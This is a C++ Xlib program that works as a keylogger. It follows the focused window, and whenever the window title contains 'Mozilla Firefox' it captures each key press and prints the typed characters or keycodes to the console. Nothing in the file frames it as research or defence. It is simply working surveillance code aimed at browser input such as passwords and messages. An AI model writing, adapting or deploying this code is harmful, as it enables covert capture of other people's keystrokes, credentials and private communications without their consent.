#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <iostream>
#include <unistd.h>
#include <X11/Xatom.h>
#include <string.h>
using namespace std;


string WINDOWS_FIREFOX = "Mozilla Firefox";

char *name (Display *disp, Window win) {
    Atom prop = XInternAtom(disp,"WM_NAME",False), type;
    int form;
    unsigned long remain, len;
    unsigned char *list;
    if (XGetWindowProperty(disp,win,prop,0,1024,False,AnyPropertyType,
                &type,&form,&len,&remain,&list) != Success) {
        return strdup("Root");
    }
    return (char*)list;
}

int main(int argc, char* argv[]){
    Display *disp = XOpenDisplay(NULL);
    Window activeWindow = -1;
    char* active;
	bool running = true;
    char buf[17];
    KeySym ks;
    XComposeStatus comp;
    int len;
    int revert;
    int c = 0;
    string activeName;
    Window root = DefaultRootWindow(disp);
    XGetInputFocus (disp, &activeWindow, &revert);
    XSelectInput(disp, activeWindow, KeyPressMask|KeyReleaseMask|FocusChangeMask);
    active = name(disp, activeWindow);
    while (running) {
        XEvent ev;
        XNextEvent(disp, &ev);
        switch (ev.type) {
            case FocusOut: 
            {
                // if (activeWindow != root)
                //     XSelectInput(disp, activeWindow, 0);
                // FUCK THIS SHIT
                XGetInputFocus (disp, &activeWindow, &revert);
                if (name(disp,activeWindow) != NULL){
                    cout << "Changed to " ;
                    active = name(disp,activeWindow);
                    cout<<string(active);
                    cout<<endl;
                }
                if (activeWindow == PointerRoot) {
                    activeWindow = root;
                }                
                XSelectInput(disp, activeWindow, KeyPressMask|KeyReleaseMask|FocusChangeMask);
                break;
            }

            case KeyPress: 
            {
                if (active != NULL){
                    activeName = string(active);
                    if (activeName.find(WINDOWS_FIREFOX) != std::string::npos){
                        len = XLookupString(&ev.xkey, buf, 16, &ks, &comp);
                        if (len > 0 && isprint(buf[0])) {
                            buf[len]=0;
                            cout << "Keypressed: " << buf << endl;
                        }
                        else {
                            cout << "Keycode: " << (int)ks << endl;
                        }
                    }
                }
                break;
            }
        }
    }
    XCloseDisplay(disp);
}